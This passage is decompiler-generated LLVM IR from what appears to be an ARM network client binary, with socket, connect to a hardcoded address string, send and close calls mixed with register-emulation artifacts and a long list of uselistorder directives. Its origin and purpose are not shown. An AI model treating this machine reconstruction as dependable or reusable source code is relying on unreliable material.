dec_label_pc_11114:                               ; preds = %dec_label_pc_11108, %dec_label_pc_111c8
  %v0_11114 = load i32, i32* @r6, align 4
  %v1_11114 = add i32 %v0_11114, 4
  %v2_11114 = inttoptr i32 %v1_11114 to i32*
  %v3_11114 = load i32, i32* %v2_11114, align 4
  store i32 %v3_11114, i32* %r0.global-to-local, align 4
  %v1_11118 = call i32 @close(i32 %v3_11114)
  store i32 %v1_11118, i32* %r0.global-to-local, align 4
  %v0_1111c = load i32, i32* @r6, align 4
  %v1_1111c = add i32 %v0_1111c, 284
  %v2_1111c = inttoptr i32 %v1_1111c to i8*
  %v3_1111c = load i8, i8* %v2_1111c, align 1
  %v4_1111c = zext i8 %v3_1111c to i32
  %v1_11120 = add nuw nsw i32 %v4_1111c, 1
  %v1_11124 = urem i32 %v1_11120, 256
  store i32 %v1_11124, i32* %r3.global-to-local, align 4
  %v2_11128 = icmp ugt i32 %v1_11124, 8
  store i1 %v2_11128, i1* %cpsr_c.global-to-local, align 1
  %v7_11128 = icmp eq i32 %v1_11124, 9
  store i1 %v7_11128, i1* %cpsr_z.global-to-local, align 1
  %v2_1112c = xor i1 %v7_11128, true
  %v3_1112c = and i1 %v2_11128, %v2_1112c
  br i1 %v3_1112c, label %bb377, label %bb378

bb377:                                            ; preds = %dec_label_pc_11114
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb378

bb378:                                            ; preds = %dec_label_pc_11114, %bb377
  store i32 -1, i32* @r4, align 4
  %v1_11134 = trunc i32 %v1_11120 to i8
  store i8 %v1_11134, i8* %v2_1111c, align 1
  %v0_11138 = load i32, i32* @r4, align 4
  %v1_11138 = load i32, i32* @r6, align 4
  %v2_11138 = add i32 %v1_11138, 4
  %v3_11138 = inttoptr i32 %v2_11138 to i32*
  store i32 %v0_11138, i32* %v3_11138, align 4
  %v0_1113c = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1113c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_1113c = xor i1 %v1_1113c, true
  %v3_1113c = and i1 %v0_1113c, %v2_1113c
  br i1 %v3_1113c, label %bb379, label %.thread241

bb379:                                            ; preds = %bb378
  %v4_1113c = load i32, i32* %r0.global-to-local, align 4
  %v5_1113c = load i32, i32* @r6, align 4
  %v6_1113c = add i32 %v5_1113c, 12
  %v7_1113c = inttoptr i32 %v6_1113c to i32*
  store i32 %v4_1113c, i32* %v7_1113c, align 4
  %v4_11140 = load i32, i32* %r0.global-to-local, align 4
  %v5_11140 = trunc i32 %v4_11140 to i8
  %v6_11140 = load i32, i32* @r6, align 4
  %v7_11140 = add i32 %v6_11140, 284
  %v8_11140 = inttoptr i32 %v7_11140 to i8*
  store i8 %v5_11140, i8* %v8_11140, align 1
  %v0_11144.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11144.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread241

.thread241:                                       ; preds = %bb378, %bb379
  %v1_11144 = phi i1 [ %v1_11144.pre, %bb379 ], [ %v1_1113c, %bb378 ]
  %v0_11144 = phi i1 [ %v0_11144.pre, %bb379 ], [ %v0_1113c, %bb378 ]
  %v2_11144 = xor i1 %v1_11144, true
  %v3_11144 = and i1 %v0_11144, %v2_11144
  br i1 %v3_11144, label %dec_label_pc_10644, label %dec_label_pc_11148

dec_label_pc_11148:                               ; preds = %.thread241
  %v0_11148 = load i32, i32* @r6, align 4
  store i32 %v0_11148, i32* @r0, align 4
  %v0_1114c = call i32 @function_f928()
  store i32 %v0_1114c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10644

dec_label_pc_11154:                               ; preds = %dec_label_pc_10fc4
  store i32 %v2_10f94, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_11164 = add i32 %v0_10fb0, 4
  %v2_11164 = inttoptr i32 %v1_11164 to i32*
  %v3_11164 = load i32, i32* %v2_11164, align 4
  store i32 %v3_11164, i32* %r0.global-to-local, align 4
  %v5_11168 = call i32 @send(i32 %v3_11164, i32* nonnull %stack_var_-41, i32 3, i32 16384)
  store i32 %v5_11168, i32* %r0.global-to-local, align 4
  store i32 %v2_105d8, i32* %r1.global-to-local, align 4
  %v0_11170 = load i32, i32* @r6, align 4
  %v1_11170 = add i32 %v0_11170, 4
  %v2_11170 = inttoptr i32 %v1_11170 to i32*
  %v3_11170 = load i32, i32* %v2_11170, align 4
  store i32 %v3_11170, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10968

dec_label_pc_11180:                               ; preds = %dec_label_pc_10818
  store i32 %.pre, i32* %r0.global-to-local, align 4
  %v1_11188 = add i32 %v0_11180, 92
  store i32 %v1_11188, i32* %r1.global-to-local, align 4
  store i32 192, i32* %r2.global-to-local, align 4
  %v3_11190 = inttoptr i32 %.pre to i32*
  %v4_11190 = inttoptr i32 %v1_11188 to i32*
  %v5_11190 = call i32* @memmove(i32* %v3_11190, i32* %v4_11190, i32 192)
  %v7_11190 = ptrtoint i32* %v5_11190 to i32
  store i32 %v7_11190, i32* %r0.global-to-local, align 4
  %v0_11194 = load i32, i32* @r6, align 4
  %v1_11194 = add i32 %v0_11194, 24
  %v2_11194 = inttoptr i32 %v1_11194 to i32*
  %v3_11194 = load i32, i32* %v2_11194, align 4
  store i32 %v3_11194, i32* %r3.global-to-local, align 4
  %v1_11198 = add i32 %v3_11194, -64
  store i32 %v1_11198, i32* %ip.global-to-local, align 4
  store i32 %v1_11198, i32* %v2_11194, align 4
  br label %dec_label_pc_10828

dec_label_pc_111a4:                               ; preds = %dec_label_pc_10d00
  %v0_111a4 = load i32, i32* @r6, align 4
  store i32 %v0_111a4, i32* @r0, align 4
  %v0_111a8 = call i32 @function_f928()
  store i32 %v0_111a8, i32* %r0.global-to-local, align 4
  %v0_111ac = load i32, i32* @r6, align 4
  %v1_111ac = add i32 %v0_111ac, 24
  %v2_111ac = inttoptr i32 %v1_111ac to i32*
  %v3_111ac = load i32, i32* %v2_111ac, align 4
  store i32 %v3_111ac, i32* %ip.global-to-local, align 4
  %v0_111b0 = load i32, i32* @r4, align 4
  store i32 %v0_111b0, i32* @r7, align 4
  br label %dec_label_pc_10d48

dec_label_pc_111b8:                               ; preds = %thread-pre-split100
  %v0_111c0 = load i32, i32* @r6, align 4
  %v1_111c0 = add i32 %v0_111c0, 12
  %v2_111c0 = inttoptr i32 %v1_111c0 to i32*
  %v3_111c0 = load i32, i32* %v2_111c0, align 4
  br label %dec_label_pc_10810.backedge

dec_label_pc_111c8:                               ; preds = %dec_label_pc_110fc
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_111cc = load i32, i32* @sb, align 4
  %v2_111cc = inttoptr i32 %v1_111cc to i32*
  store i32 104, i32* %v2_111cc, align 4
  br label %dec_label_pc_11114

dec_label_pc_111d4:                               ; preds = %dec_label_pc_1072c, %dec_label_pc_106e4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_111d8

dec_label_pc_111d8:                               ; preds = %dec_label_pc_10754, %dec_label_pc_111d4
  %v0_111e0 = phi i32 [ 0, %dec_label_pc_111d4 ], [ %v0_10734, %dec_label_pc_10754 ]
  %v0_111d8 = load i32, i32* @r6, align 4
  %v1_111d8 = add i32 %v0_111d8, 4
  %v2_111d8 = inttoptr i32 %v1_111d8 to i32*
  %v3_111d8 = load i32, i32* %v2_111d8, align 4
  store i32 %v3_111d8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_111e0 = inttoptr i32 %v0_111d8 to i32*
  store i32 %v0_111e0, i32* %v2_111e0, align 4
  %v0_111e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_111e4 = load i32, i32* @r6, align 4
  %v2_111e4 = add i32 %v1_111e4, 24
  %v3_111e4 = inttoptr i32 %v2_111e4 to i32*
  store i32 %v0_111e4, i32* %v3_111e4, align 4
  %v0_1061c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1061c

dec_label_pc_111ec:                               ; preds = %dec_label_pc_106a4
  %v0_111ec = load i32, i32* @r6, align 4
  %v1_111ec = add i32 %v0_111ec, 4
  %v2_111ec = inttoptr i32 %v1_111ec to i32*
  %v3_111ec = load i32, i32* %v2_111ec, align 4
  store i32 %v3_111ec, i32* %r0.global-to-local, align 4
  %v1_111f0 = call i32 @close(i32 %v3_111ec)
  store i32 %v1_111f0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_111f8 = load i32, i32* @r5, align 4
  %v1_111f8 = load i32, i32* @r6, align 4
  %v2_111f8 = add i32 %v1_111f8, 12
  %v3_111f8 = inttoptr i32 %v2_111f8 to i32*
  store i32 %v0_111f8, i32* %v3_111f8, align 4
  %v0_111fc = load i32, i32* %r4.global-to-local, align 4
  %v1_111fc = load i32, i32* @r6, align 4
  %v2_111fc = add i32 %v1_111fc, 4
  %v3_111fc = inttoptr i32 %v2_111fc to i32*
  store i32 %v0_111fc, i32* %v3_111fc, align 4
  %v0_11200 = load i32, i32* @r5, align 4
  %v1_11200 = trunc i32 %v0_11200 to i8
  %v2_11200 = load i32, i32* @r6, align 4
  %v3_11200 = add i32 %v2_11200, 284
  %v4_11200 = inttoptr i32 %v3_11200 to i8*
  store i8 %v1_11200, i8* %v4_11200, align 1
  br label %dec_label_pc_10644

dec_label_pc_11208:                               ; preds = %dec_label_pc_107cc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_1120c = call i32 @function_112dc(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_11214 = call i32 @function_112dc(i32 30)
  store i32 %v1_11214, i32* %r0.global-to-local, align 4
  %v0_11218 = load i32, i32* @r6, align 4
  %v1_11218 = add i32 %v0_11218, 12
  %v2_11218 = inttoptr i32 %v1_11218 to i32*
  %v3_11218 = load i32, i32* %v2_11218, align 4
  br label %dec_label_pc_10810.backedge

dec_label_pc_10810.backedge.thread:               ; preds = %dec_label_pc_10ae8, %dec_label_pc_10c10, %dec_label_pc_10d6c, %dec_label_pc_10e20, %dec_label_pc_10ed4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10818

dec_label_pc_10810.backedge.thread501:            ; preds = %dec_label_pc_10b14, %dec_label_pc_10c3c, %dec_label_pc_10f00, %dec_label_pc_10d98, %dec_label_pc_10e4c, %dec_label_pc_10b30, %dec_label_pc_10c58, %dec_label_pc_10db4, %dec_label_pc_10e68, %dec_label_pc_10f1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10818

dec_label_pc_10810.backedge:                      ; preds = %dec_label_pc_11208, %dec_label_pc_111b8
  %storemerge503 = phi i32 [ %v3_111c0, %dec_label_pc_111b8 ], [ %v3_11218, %dec_label_pc_11208 ]
  %v0_10810.be = phi i32 [ %v3_111c0, %dec_label_pc_111b8 ], [ %v3_11218, %dec_label_pc_11208 ]
  %v0_10818158 = phi i32 [ %v0_111c0, %dec_label_pc_111b8 ], [ %v0_11218, %dec_label_pc_11208 ]
  store i32 %storemerge503, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10810 = icmp eq i32 %v0_10810.be, 0
  store i1 %v2_10810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10810, label %dec_label_pc_10644, label %dec_label_pc_10818

dec_label_pc_11220:                               ; preds = %bb376
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1122c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1122c, i32* %r0.global-to-local, align 4
  %v2_11230 = icmp eq i32 %v3_1122c, -1
  store i1 %v2_11230, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_11230, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1122c, i32* @r4, align 4
  br i1 %v2_11230, label %dec_label_pc_10444, label %dec_label_pc_1123c

dec_label_pc_1123c:                               ; preds = %dec_label_pc_11220
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_11240 = call i32 @function_11394(i32 4)
  store i32 2, i32* @r6, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_12270.135 to i32), i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_11254 = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_12270.135, i32 0, i32 0))
  %v0_11258 = load i32, i32* @r5, align 4
  store i32 %v0_11258, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_11264 = inttoptr i32 %v0_11258 to i32*
  %v3_11264 = call i32 @function_112b0(i32 4, i32* %v2_11264)
  %v4_11264 = inttoptr i32 %v3_11264 to i8*
  store i32 %v3_11264, i32* %r0.global-to-local, align 4
  %v2_11268 = add i32 %v3_11264, 1
  %v3_11268 = inttoptr i32 %v2_11268 to i8*
  %v4_11268 = load i8, i8* %v3_11268, align 1
  %v5_11268 = zext i8 %v4_11268 to i32
  store i32 %v5_11268, i32* %r2.global-to-local, align 4
  %v3_1126c = load i8, i8* %v4_11264, align 1
  %v4_1126c = zext i8 %v3_1126c to i32
  %v4_11270 = mul nuw nsw i32 %v5_11268, 256
  %v5_11270 = or i32 %v4_1126c, %v4_11270
  store i32 %v5_11270, i32* %r3.global-to-local, align 4
  %v1_11274 = and i32 %v4_1126c, 128
  %v2_11274 = icmp ne i32 %v1_11274, 0
  store i1 %v2_11274, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_11268, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_11284 = call i32 @function_112dc(i32 4)
  %v0_11288 = load i32, i32* @r4, align 4
  store i32 %v0_11288, i32* %r0.global-to-local, align 4
  store i32 %v2_101cc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v5_11294 = call i32 @connect(i32 %v0_11288, %sockaddr* %tmp298, i32 16)
  store i32 %v5_11294, i32* %r0.global-to-local, align 4
  %v3_11298 = icmp eq i32 %v5_11294, -1
  store i1 %v3_11298, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_11298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11298, label %dec_label_pc_112a0, label %dec_label_pc_103a0

dec_label_pc_112a0:                               ; preds = %dec_label_pc_1123c
  %v0_112a0 = load i32, i32* @r4, align 4
  store i32 %v0_112a0, i32* %r0.global-to-local, align 4
  %v1_112a4 = call i32 @close(i32 %v0_112a0)
  %v0_112a8 = load i32, i32* @r5, align 4
  store i32 %v0_112a8, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_112a8)
  unreachable

; uselistorder directives
  uselistorder i1 %v3_11298, { 1, 0, 2 }
  uselistorder i32 %v4_1126c, { 1, 0 }
  uselistorder i32 %v5_11268, { 1, 0, 2 }
  uselistorder i32 %v3_11218, { 1, 0 }
  uselistorder i32 %v3_111c0, { 1, 0 }
  uselistorder i1 %v1_1113c, { 1, 0 }
  uselistorder i32 %v1_11124, { 2, 1, 0 }
  uselistorder i32 %v1_11120, { 1, 0 }
  uselistorder i1 %v3_11100, { 1, 0, 2 }
  uselistorder i1 %v2_110d8, { 1, 0 }
  uselistorder i32 %.385, { 1, 0 }
  uselistorder i1 %v2_110c0, { 1, 0 }
  uselistorder i32 %v0_110bc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1109c, { 1, 0, 2 }
  uselistorder i32 %v4_11098, { 1, 0, 2 }
  uselistorder i32 %v0_11088, { 2, 1, 3, 0 }
  uselistorder i1 %v3_11038, { 1, 0, 2 }
  uselistorder i32 %v0_11038, { 1, 0 }
  uselistorder i1 %v0_11028, { 1, 0 }
  uselistorder i32 %v4_1101c, { 1, 0, 2 }
  uselistorder i32 %v0_10fb0, { 1, 2, 0 }
  uselistorder i1 %v7_10f20, { 1, 0 }
  uselistorder i32 %v1_10f1c, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10f14, { 1, 0 }
  uselistorder i8 %v3_10f0c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10f1c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10ef8, { 1, 0 }
  uselistorder i1 %v7_10ef0, { 1, 0 }
  uselistorder i1 %v7_10ee8, { 1, 0 }
  uselistorder i1 %v7_10e6c, { 1, 0 }
  uselistorder i32 %v1_10e68, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10e60, { 1, 0 }
  uselistorder i8 %v3_10e58, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10e68, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10e44, { 1, 0 }
  uselistorder i1 %v7_10e3c, { 1, 0 }
  uselistorder i1 %v7_10e34, { 1, 0 }
  uselistorder i1 %v7_10db8, { 1, 0 }
  uselistorder i32 %v1_10db4, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10dac, { 1, 0 }
  uselistorder i8 %v3_10da4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10db4, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10d90, { 1, 0 }
  uselistorder i1 %v7_10d88, { 1, 0 }
  uselistorder i1 %v7_10d80, { 1, 0 }
  uselistorder i32 %v0_10d5c, { 1, 2, 0 }
  uselistorder i32 %v2_10d48, { 1, 0 }
  uselistorder i32 %v1_10d48, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_10d48, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i32 %v1_10d18, { 2, 1, 0 }
  uselistorder i1 %v7_10c5c, { 1, 0 }
  uselistorder i32 %v1_10c58, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10c50, { 1, 0 }
  uselistorder i8 %v3_10c48, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10c58, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10c34, { 1, 0 }
  uselistorder i1 %v7_10c2c, { 1, 0 }
  uselistorder i1 %v7_10c24, { 1, 0 }
  uselistorder i1 %v7_10b34, { 1, 0 }
  uselistorder i32 %v1_10b30, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10b28, { 1, 0 }
  uselistorder i8 %v3_10b20, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10b30, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10b0c, { 1, 0 }
  uselistorder i1 %v7_10b04, { 1, 0 }
  uselistorder i1 %v7_10afc, { 1, 0 }
  uselistorder i32 %v0_10aa4, { 2, 1, 0 }
  uselistorder i1 %v7_10a94, { 1, 0 }
  uselistorder i1 %v8_10a88, { 1, 0 }
  uselistorder i8 %v3_10a80, { 4, 5, 6, 7, 8, 3, 2, 1, 0 }
  uselistorder i32 %v0_10a90, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10a6c, { 1, 0 }
  uselistorder i1 %v7_10a64, { 1, 0 }
  uselistorder i32 %v0_10a0c, { 2, 1, 0 }
  uselistorder i1 %v7_109f4, { 1, 0 }
  uselistorder i1 %v8_109e8, { 1, 0 }
  uselistorder i8 %v3_109e0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_109f0, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_109cc, { 1, 0 }
  uselistorder i1 %v7_109c4, { 1, 0 }
  uselistorder i1 %v7_109bc, { 1, 0 }
  uselistorder i32 %v0_10988, { 0, 2, 1 }
  uselistorder i32 %v1_10980, { 1, 0 }
  uselistorder i32 %v1_1097c, { 1, 0 }
  uselistorder i32 %v1_10974, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_10970, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_10970, { 0, 2, 1 }
  uselistorder i1 %v7_10910, { 1, 0 }
  uselistorder i1 %v2_108fc, { 1, 0, 2 }
  uselistorder i1 %v2_108e4, { 1, 0, 2 }
  uselistorder i32 %v1_10904, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_108d8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v1_10900, { 1, 0 }
  uselistorder i32 %v2_10908, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v3_108c4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1088c, { 3, 16, 4, 18, 5, 17, 6, 15, 7, 14, 8, 13, 9, 12, 2, 10, 11, 19, 1, 0 }
  uselistorder i32 %v1_10868, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10864, { 1, 0 }
  uselistorder i32 %v5_10848, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 %v2_10834, { 1, 0, 2 }
  uselistorder i32 %v3_10830, { 1, 0, 2 }
  uselistorder i32 %v0_11180, { 1, 0, 2 }
  uselistorder i1 %v3_10804, { 1, 0, 2 }
  uselistorder i1 %v7_107e4, { 1, 0 }
  uselistorder i1 %v7_107bc, { 1, 0 }
  uselistorder i32 %v0_10734, { 0, 3, 2, 4, 6, 5, 1 }
  uselistorder i32 %v2_10708, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_10700, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_10694, { 2, 1, 0 }
  uselistorder i32 %v3_10690, { 1, 0 }
  uselistorder i32 %v3_10670, { 4, 3, 1, 0, 5, 6, 2 }
  uselistorder i32 %v0_10664, { 1, 0 }
  uselistorder i32 %v1_10648, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_10634, { 2, 1, 0 }
  uselistorder i32 %v3_10630, { 1, 0 }
  uselistorder i32 %v0_10634, { 1, 0 }
  uselistorder i32 %v1_105cc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_105cc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1059c, { 2, 1, 0 }
  uselistorder i32 %v1_10598, { 1, 0 }
  uselistorder i32 %v0_10568, { 0, 2, 1 }
  uselistorder i32 %v1_10560, { 1, 0 }
  uselistorder i1 %v7_10518, { 0, 3, 1, 2 }
  uselistorder i1 %v2_10518, { 1, 2, 0 }
  uselistorder i32 %v2_10510, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v0_10508, { 1, 0 }
  uselistorder i32 %v1_104ec, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_104e0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_104e0, { 0, 2, 1 }
  uselistorder i32 %v1_104d0, { 1, 0 }
  uselistorder i32 %v3_10544, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %storemerge245, { 1, 0, 2 }
  uselistorder i32 %v3_1038c, { 1, 0 }
  uselistorder i32 %v1_10378, { 1, 0 }
  uselistorder i32 %v1_10360, { 1, 2, 0 }
  uselistorder i32 %v0_1036c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10330, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v2_10324, { 2, 1, 0 }
  uselistorder i32 %v1_10300, { 3, 1, 0, 4, 2 }
  uselistorder i1 %v2_102d8, { 1, 0 }
  uselistorder i32 %v0_1023c, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_101e4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_10108, { 1, 0 }
  uselistorder i32 %v1_10104, { 1, 0 }
  uselistorder i32 %v4_100e0, { 1, 0 }
  uselistorder i1 %v2_10030, { 1, 0 }
  uselistorder i1 %v2_1001c, { 1, 0 }
  uselistorder i1 %v2_10008, { 1, 0 }
  uselistorder i32 %.384, { 3, 2, 1, 0 }
  uselistorder i1 %v7_ffe4, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_ffcc, { 1, 0 }
  uselistorder i1 %v3_ffb0, { 1, 0, 2 }
  uselistorder i1 %v2_ff9c, { 1, 0 }
  uselistorder i1 %v2_ff78, { 1, 0 }
  uselistorder i32 %v1_ff28, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ff14, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 54, 29, 28, 53, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_ff10, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v4_ff00, { 1, 0 }
  uselistorder i32 %v0_fef0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fecc, { 1, 0 }
  uselistorder i32 %v2_10c78, { 2, 3, 1, 0 }
  uselistorder i32 %v2_10780, { 3, 7, 4, 5, 2, 6, 8, 9, 1, 0 }
  uselistorder i32 %v2_10fa4, { 1, 0 }
  uselistorder i32 %v2_10554, { 0, 4, 1, 5, 2, 7, 3, 6 }
  uselistorder i32 %v2_feb8, { 1, 2, 4, 5, 0, 3, 8, 7, 6, 9 }
  uselistorder i32 %v2_feb4, { 3, 2, 0, 5, 4, 1, 6 }
  uselistorder i32 %v4_fd98, { 1, 0 }
  uselistorder i32 %v3_fd58, { 1, 0 }
  uselistorder i32 %v4_fd44, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32 %v0_fd2c, { 0, 2, 1 }
  uselistorder i32 %v0_fcd4, { 3, 2, 0, 1 }
  uselistorder i32 %v3_fc6c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_fc54, { 0, 2, 1 }
  uselistorder i32 %v0_fc3c, { 2, 1, 0 }
  uselistorder i32 %v0_fc18, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge252, { 1, 0 }
  uselistorder i32 %v0_fbac, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 14, 12, 13 }
  uselistorder i32* %stack_var_-92, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-56, { 10, 7, 11, 3, 12, 6, 13, 5, 14, 8, 15, 4, 16, 17, 1, 2, 9, 18, 0, 19, 20 }
  uselistorder i32* %stack_var_-48, { 4, 5, 3, 6, 2, 7, 0, 8, 1, 9 }
  uselistorder i32* %stack_var_-38, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %sp.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %sl.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 7, 1, 6, 5, 4, 10, 8, 9, 11, 12, 13 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 12, 51, 50, 37, 52, 53, 130, 13, 14, 15, 27, 38, 39, 40, 41, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 32, 33, 132, 133, 134, 34, 35, 36, 42, 43, 44, 45, 46, 47, 48, 49, 131, 54, 55, 56, 57, 58, 59, 135, 136, 60, 61, 63, 62, 64, 65, 66, 67, 69, 71, 70, 68, 72, 73, 74, 75, 81, 76, 77, 78, 79, 82, 147, 148, 83, 145, 146, 137, 138, 139, 140, 141, 142, 143, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 129, 101, 102, 103, 104, 105, 144, 106, 107, 109, 108, 111, 110, 112, 114, 113, 116, 115, 80, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i32* %r2.global-to-local, { 9, 10, 11, 128, 35, 28, 12, 13, 14, 15, 16, 24, 29, 30, 31, 32, 0, 1, 2, 3, 5, 4, 6, 8, 7, 115, 17, 18, 20, 19, 21, 22, 23, 25, 27, 26, 116, 118, 117, 33, 34, 114, 36, 37, 38, 39, 40, 41, 42, 119, 120, 43, 44, 45, 46, 47, 49, 51, 50, 113, 48, 52, 53, 54, 55, 56, 60, 57, 58, 59, 61, 63, 65, 64, 62, 66, 121, 122, 123, 124, 125, 126, 127, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 83, 84, 81, 82, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112 }
